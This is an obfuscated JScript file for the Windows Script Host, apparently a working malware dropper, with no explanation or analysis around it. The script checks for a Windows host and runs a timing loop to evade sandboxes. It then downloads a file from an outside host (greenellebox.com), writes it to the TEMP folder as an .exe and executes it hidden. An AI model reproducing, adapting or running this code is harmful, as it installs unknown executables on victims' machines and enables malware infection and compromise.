var u = false;
var TK = "CreateObject";
var lR = function E() {return WScript[TK]("WScript.Shell");}(), PJ = 11;
var B = "MSXML2.XMLHTTP";
var Et = 2123213;
var Jx = 0;
function aP(x){lR["Run"](x, Jx, Jx);};
function Me(){return "" + B;};
function G(T, mz){Jx = Jx * 1; return T - mz;};
function F(){return TK;};
/*@cc_on
  @if (@_win32 || @_win64)
    u = true;
  @end
@*/
if (u)
{
var yh = "";
function X(){return 22;};
var i = 0; var H = 0;
function kq()
{
var l = new this["Date"]();
var v0 = l["getUTCMilliseconds"]();
WScript["Sleep"](X());
var l = new this["Date"]();
var SH = l["getUTCMilliseconds"]();
WScript["Sleep"](X());
var l = new this["Date"]();
var LV = l["getUTCMilliseconds"]();
var i = "sw";
i = G(SH, v0);
var H = "Bx";
H = G(LV, SH);
yh = "open";
return G(i, H);
}
var i0 = false;
var WI = false;
for (var D = Jx; D < X() * 1; D++){if (kq() != Jx){
i0 = true; 
H = "31" + 11 * i + H; 
WI = true; 
break;
}}
function ys() {return ((i0 == true) && (i0 == WI)) ? 1 : Jx;};
if (i0 && ys() && WI){
function j() {return lR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Bxejk2of4.exe";};
 qg = Me();
 gH = WScript[TK](qg);
 var N = 1;
 while (N){
try {
gH[yh]("GET", "http://greenellebox.com/a1odk", false);
gH["send"]();
YS = "Sleep";
for (;;){WScript[YS](X() * 11); if (gH["readystate"] >= 2 * 2) break;};
N = Jx;
} catch(YP){};
}
function PI(Y) {var Y0 = (1, 2, 3, 4, 5, Y); return Y0;};
g = WScript[F()]("ADODB.Stream");
qg = g;
qg[yh]();
qg["type"] = PI(1);
qg["write"](gH["ResponseBody"]);
g["position"] = PI(Jx);
qg["Save" + "ToFile"](j(), 2);
g["c"+"lose"]();
v = j();
aP(v);
}
}

